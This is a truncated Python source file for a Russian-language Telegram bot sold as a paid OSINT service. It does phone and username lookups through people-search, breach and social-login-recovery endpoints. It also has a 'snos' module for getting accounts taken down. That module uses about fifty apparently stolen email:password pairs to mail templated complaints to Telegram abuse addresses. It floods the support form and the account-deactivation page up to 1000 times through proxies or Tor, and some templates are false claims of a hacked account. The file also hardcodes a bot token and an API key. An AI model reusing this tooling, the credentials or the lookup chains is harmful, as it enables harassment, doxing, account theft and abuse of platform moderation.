import telebot
import phonenumbers
import requests
import subprocess
import ipaddress
import os
import re
import json
import socket
import ssl
import threading
import time
import urllib.request
import whois
import dns.resolver
import xml.etree.ElementTree as ET
import csv
import glob
import random
import math
import logging
import io
import base64
import mimetypes
import hashlib
import smtplib
import itertools
import collections
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from logging.handlers import RotatingFileHandler
from xml.dom import minidom
from datetime import datetime
from phonenumbers import geocoder, carrier, timezone
from telebot import types
from urllib.parse import quote, urlparse, parse_qs
from bs4 import BeautifulSoup
from PIL import Image
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    BaseDocTemplate, Frame, PageTemplate,
)
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
import openpyxl

# ================== ЛОГИРОВАНИЕ ==================
LOG_FILE = "bot.log"

logger = logging.getLogger("osint_bot")
logger.setLevel(logging.INFO)
if not logger.handlers:
    try:
        _handler = RotatingFileHandler(LOG_FILE, maxBytes=5 * 1024 * 1024, backupCount=5, encoding="utf-8")
        _handler.setFormatter(logging.Formatter("[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))
        logger.addHandler(_handler)
    except Exception:
        pass
    _stream = logging.StreamHandler()
    _stream.setFormatter(logging.Formatter("[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))
    logger.addHandler(_stream)


def log(msg):
    logger.info(msg)

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8897963676:AAFaiG-ffnDgBcwJMWZME0hcgMaJPxP473Y")
ADMIN_USERNAME = "lonazov"
BLOCKED_FILE = "blocked_users.json"
USERS_FILE = "users.json"
MAINTENANCE_FILE = "maintenance.json"
MONITORED_FILE = "monitored_sites.json"

MAINTENANCE_TEXT = "⚠️ <b>УВАЖАЕМЫЕ ПОЛЬЗОВАТЕЛИ МЫ УХОДИМ НА ПЕРЕРЫВ НО СКОРО ВЕРНЁМСЯ!</b>"
MAINTENANCE_RESUME_TEXT = "✅ <b>Бот снова работает! Спасибо за ожидание.</b>"

ABOUT_TEXT = (
    "👑 <b>О нас</b>\n"
    "━━━━━━━━━━━━━━━━━━\n"
    "@lonazov — Лоназов, владелец данного бота, написавший его в 2026 году.\n\n"
    "Его канал вы можете найти в закреплённом сообщении (там есть ссылка).\n\n"
    "Это не просто бот — это ваша возможность стать чем-то большим "
    "в мире кибербезопасности и в целом в КМ!\n\n"
    "💎 Оплата VIP принимается рублями (ЮMoney), NFT на @lonazov или криптой (TON). "
    "Без скриншота подтверждения заявка отклоняется."
)

# ================== GITHUB-ХРАНИЛИЩЕ БАЗ ==================
GITHUB_USER   = "4987324982"
GITHUB_REPO   = "-"
GITHUB_BRANCH = "main"

DB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "databases")
os.makedirs(DB_DIR, exist_ok=True)

HTMLWEB_URL = "https://htmlweb.ru/geo/api.php?json&telcod="
VERIPHONE_URL = "https://api.veriphone.io/v2/verify?phone="
VERIPHONE_API_KEY = "133DF840CE4B40AEABC341B7CA407A2D"

NUMVERIFY_URL = "http://apilayer.net/api/validate"
NUMVERIFY_KEY = os.environ.get("NUMVERIFY_KEY", "")

ABSTRACTAPI_URL = "https://phonevalidation.abstractapi.com/v1/"
ABSTRACTAPI_KEY = os.environ.get("ABSTRACTAPI_KEY", "")

IPQS_URL = "https://ipqualityscore.com/api/json/phone/"
IPQS_KEY = os.environ.get("IPQS_KEY", "")

GETCONTACT_LIVE_URL = "https://api.getcontact.app/v1/phone/"
EYECON_URL = "https://api.eyecon.mobi/api/v1/search"
SYNCME_URL = "https://sync.me/api/v1/search"
TRUECALLER_URL = "https://search5-noneu.truecaller.com/v2/search"

TELEGRAM_PHONE_URL = "https://t.me/+{phone}"
WHATSAPP_URL = "https://wa.me/{phone}"
VIBER_URL = "https://chats.viber.com/{phone}"

TWILIO_URL = "https://lookups.twilio.com/v2/PhoneNumbers/{phone}"
TWILIO_SID = os.environ.get("TWILIO_SID", "")
TWILIO_TOKEN = os.environ.get("TWILIO_TOKEN", "")

VONAGE_URL = "https://api.nexmo.com/ni/advanced/async/json"
VONAGE_KEY = os.environ.get("VONAGE_KEY", "")
VONAGE_SECRET = os.environ.get("VONAGE_SECRET", "")

TELESIGN_URL = "https://rest-ww.telesign.com/v1/phoneid/{phone}"
TELESIGN_ID = os.environ.get("TELESIGN_ID", "")
TELESIGN_AUTH = os.environ.get("TELESIGN_AUTH", "")

NUMLOOKUP_URL = "https://api.numlookupapi.com/v1/validate/{phone}"
NUMLOOKUP_KEY = os.environ.get("NUMLOOKUP_KEY", "")

MELISSA_URL = "https://globalphone.melissadata.net/v3/GlobalPhone/doPhoneLookup"
MELISSA_KEY = os.environ.get("MELISSA_KEY", "")

WHITEPAGES_URL = "https://proapi.whitepages.com/3.0/phone.json"
WHITEPAGES_KEY = os.environ.get("WHITEPAGES_KEY", "")

ZABA_URL = "https://api.zaba.ch/api/v1/phone"
CALLAPP_URL = "https://api.callapp.com/v1/search"
HIYA_URL = "https://api.hiya.com/v1/phone"
MRNUMBER_URL = "https://api.mrnumber.com/v1/phone"
SHOULD_I_ANSWER_URL = "https://api.shouldianswer.net/api/v1/lookup"
TELLOWS_URL = "https://www.tellows.ru/api/search"
KTOZVONIL_URL = "https://kto-zvonil.ru/api/v1/search"
ZVONILI_URL = "https://zvonili.com/api/v1/search"
GETIPINTEL_URL = "https://check.getipintel.net/check.php"

SPOKEO_URL = "https://api.spokeo.com/phone/{phone}"
WHITEPAGES_PEOPLE_URL = "https://api.whitepages.com/2.0/person/"
BEENVERIFIED_URL = "https://api.beenverified.com/v1/search"
RADARIS_URL = "https://radaris.com/api/v1/search"
INTELIUS_URL = "https://api.intelius.com/v1/search"
TRUTHFINDER_URL = "https://api.truthfinder.com/v1/search"
FASTPEOPLESEARCH_URL = "https://fastpeoplesearch.com/api/search"
TRUEPEOPLESEARCH_URL = "https://truepeoplesearch.com/api/search"
PEOPLEFINDERS_URL = "https://api.peoplefinders.com/v1/search"
MYLIFE_URL = "https://api.mylife.com/v1/search"

HIBP_PHONE_URL = "https://haveibeenpwned.com/api/v3/breachedaccount/{phone}"
DEHASHED_URL = "https://api.dehashed.com/search"
INTELX_PHONE_URL = "https://2.intelx.io/phonebook/search"

IPQUALITYSCORE_PHONE_URL = "https://ipqualityscore.com/api/json/phone/{key}/{phone}"
HLRLOOKUP_URL = "https://api.hlrlookup.com/api/v1/hlr"
TELESIGN_PHONEID_URL = "https://rest-ww.telesign.com/v1/phoneid/{phone}"
VONAGE_NI_URL = "https://api.nexmo.com/ni/basic/json"
TWILIO_LOOKUP_URL = "https://lookups.twilio.com/v1/PhoneNumbers/{phone}"

FACEBOOK_PHONE_URL = "https://www.facebook.com/login/identify?ctx=recover&email={phone}"
INSTAGRAM_PHONE_URL = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
LINKEDIN_PHONE_URL = "https://www.linkedin.com/checkpoint/lg/login-submit"
SNAPCHAT_PHONE_URL = "https://accounts.snapchat.com/accounts/merlin/login"
TIKTOK_PHONE_URL = "https://www.tiktok.com/passport/web/account/recover/"
TWITTER_PHONE_URL = "https://api.twitter.com/1.1/account/verify_credentials.json"

NEUTRALINO_URL = "https://neutrinoapi.net/phone-validate"
NEUTRALINO_USER = os.environ.get("NEUTRALINO_USER", "")
NEUTRALINO_KEY = os.environ.get("NEUTRALINO_KEY", "")

TELNYX_URL = "https://api.telnyx.com/v2/number_lookup/{phone}"
TELNYX_KEY = os.environ.get("TELNYX_KEY", "")

SIGNALWIRE_URL = "https://api.signalwire.com/api/laml/phone_numbers/lookup"
SIGNALWIRE_PROJECT = os.environ.get("SIGNALWIRE_PROJECT", "")
SIGNALWIRE_TOKEN = os.environ.get("SIGNALWIRE_TOKEN", "")

BANDWIDTH_URL = "https://dashboard.bandwidth.com/api/accounts/{account}/phonenumbers/{phone}"
BANDWIDTH_ACCOUNT = os.environ.get("BANDWIDTH_ACCOUNT", "")
BANDWIDTH_USER = os.environ.get("BANDWIDTH_USER", "")
BANDWIDTH_TOKEN = os.environ.get("BANDWIDTH_TOKEN", "")

PLIVO_URL = "https://api.plivo.com/v1/Account/{auth_id}/PhoneNumber/{phone}/"
PLIVO_AUTH_ID = os.environ.get("PLIVO_AUTH_ID", "")
PLIVO_AUTH_TOKEN = os.environ.get("PLIVO_AUTH_TOKEN", "")

COMMIO_URL = "https://api.thinq.com/v1/numbers/{phone}/lookup"
COMMIO_USER = os.environ.get("COMMIO_USER", "")
COMMIO_TOKEN = os.environ.get("COMMIO_TOKEN", "")

TELNYX_PHONE_URL = "https://api.telnyx.com/v2/number_lookup/{phone}"

SHERLOCK_MANIFEST_URL = "https://data.sherlockproject.xyz"
SHERLOCK_FALLBACK_SITES = {
    "GitHub": {"url": "https://github.com/{}", "urlMain": "https://github.com/", "errorType": "status_code"},
    "Instagram": {"url": "https://www.instagram.com/{}/", "urlMain": "https://www.instagram.com/", "errorType": "status_code"},
    "TikTok": {"url": "https://www.tiktok.com/@{}", "urlMain": "https://www.tiktok.com/", "errorType": "status_code"},
    "Reddit": {"url": "https://www.reddit.com/user/{}", "urlMain": "https://www.reddit.com/", "errorType": "status_code"},
    "Steam": {"url": "https://steamcommunity.com/id/{}", "urlMain": "https://steamcommunity.com/", "errorType": "status_code"},
    "Twitch": {"url": "https://www.twitch.tv/{}", "urlMain": "https://www.twitch.tv/", "errorType": "status_code"},
    "X": {"url": "https://x.com/{}", "urlMain": "https://x.com/", "errorType": "status_code"},
    "Pinterest": {"url": "https://www.pinterest.com/{}/", "urlMain": "https://www.pinterest.com/", "errorType": "status_code"},
    "Medium": {"url": "https://medium.com/@{}", "urlMain": "https://medium.com/", "errorType": "status_code"},
    "YouTube": {"url": "https://www.youtube.com/@{}", "urlMain": "https://www.youtube.com/", "errorType": "status_code"},
}
_sherlock_cache = {"sites": None, "ts": 0}

APIFY_TOKEN = os.environ.get("APIFY_TOKEN", "")
TRUECALLER_INSTALLATION_ID = os.environ.get("TRUECALLER_INSTALLATION_ID", "")
GETCONTACT_AVAILABLE = False
try:
    import getcontact_cli
    GETCONTACT_AVAILABLE = True
except ImportError:
    pass

# ================== НОВЫЕ API-КЛЮЧИ ==================
GOOGLE_STREETVIEW_KEY = os.environ.get("GOOGLE_STREETVIEW_KEY", "")
TRUEPEOPLESEARCH_APIFY_ACTOR = os.environ.get("TRUEPEOPLESEARCH_APIFY_ACTOR", "jungle_synthesizer/truepeoplesearch-people-search-scraper")
PHONE_ENRICHMENT_APIFY_ACTOR = os.environ.get("PHONE_ENRICHMENT_APIFY_ACTOR", "memo23/phone-enrichment")
NUMOOKUP_API_KEY = os.environ.get("NUMOOKUP_API_KEY", "")
THATSTHEM_ENABLED = os.environ.get("THATSTHEM_ENABLED", "true").lower() == "true"

# ================== STREETLEVEL (опционально) ==================
try:
    import streetlevel.yandex as yandex_pano
    STREETLEVEL_AVAILABLE = True
except ImportError:
    STREETLEVEL_AVAILABLE = False
    yandex_pano = None

OK_USERAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
]

SERPAPI_KEY = os.environ.get("SERPAPI_KEY", "")

GOOGLE_LENS_UPLOAD = "https://lens.google.com/v3/upload"
YANDEX_IMAGE_SEARCH = "https://yandex.ru/images/search"

MAX_PHOTO_SIZE = 15 * 1024 * 1024

VIP_FILE = "vip_users.json"
VIP_PRICES_FILE = "vip_prices.json"
PAYMENTS_FILE = "payments.json"
VIP_PAY_INFO_FILE = "vip_payment_info.json"
NFT_PAY_INFO_FILE = "nft_payment_info.json"
CRYPTO_PAY_INFO_FILE = "crypto_payment_info.json"

DEFAULT_VIP_PRICES = {
    "1d":   {"days": 1,   "price": 100,   "label": "1 день"},
    "7d":   {"days": 7,   "price": 600,  "label": "7 дней"},
    "30d":  {"days": 30,  "price": 1300, "label": "30 дней"},
    "90d":  {"days": 90,  "price": 2600, "label": "90 дней"},
    "365d": {"days": 365, "price": 3000, "label": "365 дней"},
}

VIP_PAYMENT_INFO = {
    "bank": "ЮMoney (Юмани)",
    "card": "2204 1201 4497 4629",
    "holder": "Лоназов",
    "note": "После оплаты пришлите скриншот чека администратору @lonazov.",
}

NFT_PAYMENT_INFO = {
    "network": "TON",
    "collection": "lonazov_vip",
    "receiver": "@lonazov",
    "wallet_hint": "Отправь NFT из коллекции lonazov_vip на аккаунт @lonazov в Telegram",
    "note": "После отправки NFT пришли скриншот транзакции.",
}

CRYPTO_PAYMENT_INFO = {
    "network": "TON",
    "address": "UQA6php32B3jtOuy-hNFDktjeA-Tkpb4d2T95jzDZMlV5Tah",
    "rub_per_ton": 89,
    "holder": "@lonazov",
    "note": "После перевода пришлите скриншот транзакции (хеш/скрин из кошелька).",
}

PROOF_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proofs")
os.makedirs(PROOF_DIR, exist_ok=True)

OWNER_USERNAME = ADMIN_USERNAME
OWNER_VIP_DAYS = 2_000_000

SNOS_FILE = "snos_config.json"
SNOS_STATS_FILE = "snos_stats.json"
SNOS_TEMPLATES_FILE = "snos_templates.json"

SNOS_USER_COOLDOWN = 300
SNOS_MAX_CONCURRENT = 1
SNOS_QUEUE_MAX = 5
DEFAULT_SNOS_SENDERS = {
    'sanya.dragonov@mail.ru': 'RakuzanSnos',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1',
}

DEFAULT_SNOS_RECEIVERS = [
    "stopCA@telegram.org",
    "dmca@telegram.org",
    "abuse@telegram.org",
    "sticker@telegram.org",
    "support@telegram.org",
]

SMTP_HOSTS = {
    "mail.ru": ("smtp.mail.ru", 587, False),
    "inbox.ru": ("smtp.mail.ru", 587, False),
    "list.ru": ("smtp.mail.ru", 587, False),
    "bk.ru": ("smtp.mail.ru", 587, False),
    "internet.ru": ("smtp.mail.ru", 587, False),
    "comcast.net": ("smtp.comcast.net", 587, False),
    "cox.net": ("smtp.mail.yahoo.com", 465, True),
    "verizon.net": ("smtp.verizon.net", 465, True),
    "charter.net": ("smtp.charter.net", 587, False),
    "hotmail.com": ("smtp-mail.outlook.com", 587, False),
    "live.com": ("smtp-mail.outlook.com", 587, False),
    "outlook.com": ("smtp-mail.outlook.com", 587, False),
    "aol.com": ("smtp.aol.com", 465, True),
    "usa.com": ("smtp.mail.com", 465, True),
    "mail.com": ("smtp.mail.com", 465, True),
    "iowatelecom.net": ("smtp.windstream.net", 465, True),
    "windstream.net": ("smtp.windstream.net", 465, True),
    "gmail.com": ("smtp.gmail.com", 587, False),
    "email.com": ("smtp.mail.com", 465, True),
}

SNOS_SMTP_HOST = "smtp.mail.ru"
SNOS_SMTP_PORT = 587
SNOS_DELAY_MIN = 1.5
SNOS_DELAY_MAX = 4.5
SNOS_MAX_PER_SENDER = 10**9
SNOS_COOLDOWN = 0
SNOS_SEND_TIMEOUT = 25

SNOS_WEB_FILE = "snos_web_config.json"
SNOS_WEB_STATS_FILE = "snos_web_stats.json"

DEFAULT_SNOS_WEB_CONFIG = {
    "support_url": "https://telegram.org/support",
    "deactivate_url": "https://my.telegram.org/auth?to=deactivate",
    "proxies": [],
    "user_agents": OK_USERAGENTS,
    "delay_min": 0.8,
    "delay_max": 3.2,
    "max_retries": 3,
    "timeout": 25,
    "use_tor": False,
    "broadcast_count": 1000,
    "support_payload_template": {
        "to": "stopCA",
        "subject": "Жалоба на нарушение правил Telegram",
        "message": "{message}",
        "setln": "ru"
    },
    "deactivate_payload_template": {
        "phone": "{phone}",
        "random_hash": "{random_hash}",
        "password": "",
        "to": "deactivate"
    }
}


def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default


def save_json(path, data):
    tmp = path + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        os.replace(tmp, path)
    except Exception as e:
        log(f"save_json error {path}: {e}")


snos_web_config = load_json(SNOS_WEB_FILE, DEFAULT_SNOS_WEB_CONFIG)
if not isinstance(snos_web_config, dict):
    snos_web_config = dict(DEFAULT_SNOS_WEB_CONFIG)
for _k, _v in DEFAULT_SNOS_WEB_CONFIG.items():
    snos_web_config.setdefault(_k, _v)

snos_web_stats = load_json(SNOS_WEB_STATS_FILE, {
    "support_sent": 0, "support_failed": 0,
    "deactivate_sent": 0, "deactivate_failed": 0,
    "dead_proxies": []
})

_snos_web_lock = threading.Lock()


def save_snos_web_config():
    save_json(SNOS_WEB_FILE, snos_web_config)


def save_snos_web_stats():
    save_json(SNOS_WEB_STATS_FILE, snos_web_stats)


def _snos_web_pick_proxy():
    if snos_web_config.get("use_tor"):
        return {"http": "socks5://127.0.0.1:9050",
                "https": "socks5://127.0.0.1:9050"}
    proxies = snos_web_config.get("proxies") or []
    dead = set(snos_web_stats.get("dead_proxies", []))
    alive = [p for p in proxies if p not in dead]
    if not alive:
        return None
    p = random.choice(alive)
    return {"http": p, "https": p}


def _snos_web_headers():
    return {
        "User-Agent": random.choice(snos_web_config.get("user_agents") or OK_USERAGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
        "Origin": "https://telegram.org",
        "Referer": snos_web_config["support_url"],
        "Connection": "keep-alive",
    }


def _snos_web_extract_csrf(html):
    m = re.search(r'name="random_hash"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    return None


def snos_web_support(message_text, retries=None):
    retries = retries if retries is not None else snos_web_config.get("max_retries", 3)
    url = snos_web_config["support_url"]
    tpl = snos_web_config.get("support_payload_template", {})
    payload = {
        "to": tpl.get("to", "stopCA"),
        "subject": tpl.get("subject", "Жалоба"),
        "message": message_text,
        "setln": tpl.get("setln", "ru"),
    }
    for attempt in range(retries + 1):
        proxies = _snos_web_pick_proxy()
        try:
            r = requests.post(
                url, data=payload, headers=_snos_web_headers(),
                proxies=proxies, timeout=snos_web_config.get("timeout", 25),
                allow_redirects=True,
            )
            body = r.text.lower()
            if r.status_code in (200, 302):
                if ("спасибо" in body or "thank" in body or
                    "success" in body or r.status_code == 302 or
                    "support" in r.url):
                    return True, None
                if "captcha" in body or "flood" in body:
                    time.sleep(5 + random.random() * 5)
                    continue
                return True, None
            if r.status_code in (403, 429):
                time.sleep(5 + random.random() * 5)
                continue
            return False, f"HTTP {r.status_code}"
        except requests.exceptions.ProxyError:
            if proxies:
                with _snos_web_lock:
                    if proxies["http"] not in snos_web_stats["dead_proxies"]:
                        snos_web_stats["dead_proxies"].append(proxies["http"])
                        save_snos_web_stats()
            continue
        except Exception as e:
            if attempt < retries:
                time.sleep(2 ** attempt + random.random())
                continue
            return False, str(e)[:120]
    return False, "retries_exhausted"


def snos_web_deactivate(phone, retries=None):
    retries = retries if retries is not None else snos_web_config.get("max_retries", 3)
    base = snos_web_config["deactivate_url"]
    session = requests.Session()
    session.headers.update(_snos_web_headers())
    proxies = None
    for attempt in range(retries + 1):
        proxies = _snos_web_pick_proxy()
        try:
            session.proxies.update(proxies or {})
            g = session.get(base, timeout=snos_web_config.get("timeout", 25))
            if g.status_code != 200:
                return False, f"GET HTTP {g.status_code}"
            random_hash = _snos_web_extract_csrf(g.text) or ""
            payload = {
                "phone": phone.lstrip("+"),
                "random_hash": random_hash,
                "password": "",
                "to": "deactivate",
            }
            p = session.post(
                base, data=payload,
                timeout=snos_web_config.get("timeout", 25),
                allow_redirects=True,
            )
            body = p.text.lower()
            if p.status_code == 302:
                return True, None
            if "code" in body and "sent" in body:
                return True, None
            if "phone_number_invalid" in body:
                return False, "phone_invalid"
            if "flood" in body or p.status_code in (403, 429):
                time.sleep(10 + random.random() * 10)
                continue
            if p.status_code == 200 and "deactivate" in body:
                return True, None
            return False, f"HTTP {p.status_code}"
        except requests.exceptions.ProxyError:
            if proxies:
                with _snos_web_lock:
                    if proxies["http"] not in snos_web_stats["dead_proxies"]:
                        snos_web_stats["dead_proxies"].append(proxies["http"])
                        save_snos_web_stats()
            continue
        except Exception as e:
            if attempt < retries:
                time.sleep(2 ** attempt + random.random())
                continue
            return False, str(e)[:120]
    return False, "retries_exhausted"


def snos_web_broadcast_support(chat_id, message_text, label="support"):
    total = int(snos_web_config.get("broadcast_count", 1000))
    ok = fail = 0
    status = bot.send_message(
        chat_id,
        f"📨 <b>SNOS WEB (support)</b> — {label}\n"
        f"Всего запросов: {total}\nПрогресс: 0/{total}",
        parse_mode="HTML",
    )
    last_edit = time.time()
    for i in range(1, total + 1):
        success, err = snos_web_support(message_text)
        if success:
            ok += 1
            with _snos_web_lock:
                snos_web_stats["support_sent"] += 1
                save_snos_web_stats()
        else:
            fail += 1
            with _snos_web_lock:
                snos_web_stats["support_failed"] += 1
                save_snos_web_stats()
        time.sleep(random.uniform(
            snos_web_config.get("delay_min", 0.8),
            snos_web_config.get("delay_max", 3.2)
        ))
        if time.time() - last_edit >= 5 or i == total:
            try:
                bot.edit_message_text(
                    f"📨 <b>SNOS WEB (support)</b> — {label}\n"
                    f"Прогресс: {i}/{total}\n"
                    f"✅ {ok} | ❌ {fail}",
                    chat_id, status.message_id, parse_mode="HTML",
                )
            except Exception:
                pass
            last_edit = time.time()
    bot.send_message(
        chat_id,
        f"✅ <b>SNOS WEB (support) завершён</b> — {label}\n"
        f"Всего: {total} | ✅ {ok} | ❌ {fail}",
        parse_mode="HTML",
    )


def snos_web_broadcast_deactivate(chat_id, phone, label="deactivate"):
    total = int(snos_web_config.get("broadcast_count", 1000))
    ok = fail = 0
    status = bot.send_message(
        chat_id,
        f"💀 <b>SNOS WEB (deactivate)</b> — +{phone}\n"
        f"Всего попыток: {total}\nПрогресс: 0/{total}",
        parse_mode="HTML",
    )
    last_edit = time.time()
    for i in range(1, total + 1):
        success, err = snos_web_deactivate(phone)
        if success:
            ok += 1
            with _snos_web_lock:
                snos_web_stats["deactivate_sent"] += 1
                save_snos_web_stats()
        else:
            fail += 1
            with _snos_web_lock:
                snos_web_stats["deactivate_failed"] += 1
                save_snos_web_stats()
        time.sleep(random.uniform(
            snos_web_config.get("delay_min", 0.8) * 1.5,
            snos_web_config.get("delay_max", 3.2) * 1.5
        ))
        if time.time() - last_edit >= 5 or i == total:
            try:
                bot.edit_message_text(
                    f"💀 <b>SNOS WEB (deactivate)</b> — +{phone}\n"
                    f"Прогресс: {i}/{total}\n"
                    f"✅ {ok} | ❌ {fail}",
                    chat_id, status.message_id, parse_mode="HTML",
                )
            except Exception:
                pass
            last_edit = time.time()
    bot.send_message(
        chat_id,
        f"✅ <b>SNOS WEB (deactivate) завершён</b> — +{phone}\n"
        f"Всего: {total} | ✅ {ok} | ❌ {fail}",
        parse_mode="HTML",
    )


def get_smtp_for(email_):
    domain = (email_ or "").split("@")[-1].lower()
    return SMTP_HOSTS.get(domain, (SNOS_SMTP_HOST, SNOS_SMTP_PORT, False))


_snos_data = load_json(SNOS_FILE, None)
if isinstance(_snos_data, dict):
    SNOS_SENDERS = _snos_data.get("senders") or dict(DEFAULT_SNOS_SENDERS)
    SNOS_RECEIVERS = _snos_data.get("receivers") or list(DEFAULT_SNOS_RECEIVERS)
else:
    SNOS_SENDERS = dict(DEFAULT_SNOS_SENDERS)
    SNOS_RECEIVERS = list(DEFAULT_SNOS_RECEIVERS)


def save_snos_config():
    save_json(SNOS_FILE, {"senders": SNOS_SENDERS, "receivers": SNOS_RECEIVERS})


if not os.path.exists(SNOS_FILE):
    save_snos_config()

DEFAULT_SNOS_TEMPLATES = {
    "account": {
        "spam": {
            "subjects": ["Жалоба на спам в Telegram", "Нарушение правил: спам-рассылка",
                         "Report: spam account", "Жалоба: массовая рассылка спама"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Пользователь @{username} "
                "(ID {user_id}) осуществляет массовую спам-рассылку в чатах. "
                "Ссылка на чат: {chat_link}. Пример нарушения: {violation_link}. "
                "Прошу принять меры по блокировке аккаунта.",
                "Уважаемая поддержка! Аккаунт @{username} (ID {user_id}) "
                "замечен в спаме. Чат: {chat_link}. Нарушение: {violation_link}. "
                "Пожалуйста, разберитесь.",
            ],
        },
        "doxing": {
            "subjects": ["Жалоба на доксинг в Telegram", "Нарушение: распространение личных данных",
                         "Report: doxing account"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Пользователь @{username} "
                "(ID {user_id}) распространяет чужие личные данные без согласия. "
                "Чат: {chat_link}. Нарушение: {violation_link}. Прошу блокировку.",
                "Уважаемая поддержка! Аккаунт @{username} (ID {user_id}) "
                "занимается доксингом. Ссылка на чат: {chat_link}. "
                "Доказательство: {violation_link}.",
            ],
        },
        "trolling": {
            "subjects": ["Жалоба на троллинг и нецензурную лексику",
                         "Нарушение правил: оскорбления", "Report: abusive account"],
            "bodies": [
                "Здравствуйте. Пользователь @{username} (ID {user_id}) "
                "открыто выражается нецензурной лексикой и троллит в чатах. "
                "Чат: {chat_link}. Нарушение: {violation_link}. Прошу меры.",
                "Уважаемая поддержка! Аккаунт @{username} (ID {user_id}) "
                "нарушает правила: оскорбления и троллинг. Ссылка: {chat_link}. "
                "Доказательство: {violation_link}.",
            ],
        },
        "sessions": {
            "subjects": ["Утеря доступа к аккаунту Telegram",
                         "Прошу обнулить сессии аккаунта", "Account compromised — reset sessions"],
            "bodies": [
                "Здравствуйте, уважаемая поддержка. Я случайно перешёл по "
                "фишинговой ссылке и утерял доступ к аккаунту @{username} "
                "(ID {user_id}). Прошу удалить аккаунт или обнулить сессии.",
                "Уважаемая поддержка! Мой аккаунт @{username} (ID {user_id}) "
                "был скомпрометирован. Прошу сбросить все активные сессии.",
            ],
        },
        "premium_spam": {
            "subjects": ["Жалоба: спам с Telegram Premium",
                         "Нарушение: обход ограничений через Premium",
                         "Report: premium spam account"],
            "bodies": [
                "Добрый день, поддержка Telegram! Аккаунт @{username} "
                "(ID {user_id}) приобрёл Premium, чтобы рассылать спам и "
                "обходить ограничения. Чат: {chat_link}. Нарушение: "
                "{violation_link}. Прошу проверить.",
            ],
        },
        "virtual_number": {
            "subjects": ["Жалоба: аккаунт на виртуальном номере",
                         "Нарушение: использование вирт. номера",
                         "Report: virtual number account"],
            "bodies": [
                "Добрый день, поддержка Telegram! Аккаунт @{username} "
                "(ID {user_id}) использует виртуальный номер, купленный на "
